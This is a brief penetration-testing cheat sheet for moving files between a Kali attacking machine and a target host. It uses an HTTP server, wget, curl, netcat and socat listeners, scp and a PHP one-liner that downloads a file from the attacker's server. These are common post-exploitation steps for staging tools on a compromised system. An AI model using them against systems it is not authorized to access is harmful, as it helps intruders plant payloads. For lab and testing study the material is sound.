## Kali Machine(Attacking machine)- We need to start the http server to serve the files so that other systems can access it.

### HTTP Server
```bash
python -m SimpleHTTPServer 80
python -m http.server 80
```

### Wget
```bash
wget http://192.168.1.2/filename.txt
```

### Curl
```bash
curl http://192.168.1.2/filename.txt -o filename.txt
```

## Netcat

### Target Linux
```bash
nc -nlvp 4444 > outputfile.exe
```
### Kali
```bash
nc -nv 192.168.1.2 4444 < /usr/inputfile.exe
```

## Socat
### Kali
```bash
socat TCP4-LISTEN:443,fork file:file.txt
```
### Target Linux
```bash
socat TCP4:192.168.1.2:443 file:file.txt,create
```

### SCP
```bash
scp /source/path/file.zip username@192.168.1.2:/destination/path/file.zip
```

### PHP
```bash
echo "<?php file_put_contents('filename', fopen('http://192.168.1.2/filename', 'r')); ?>" > filename.php
```
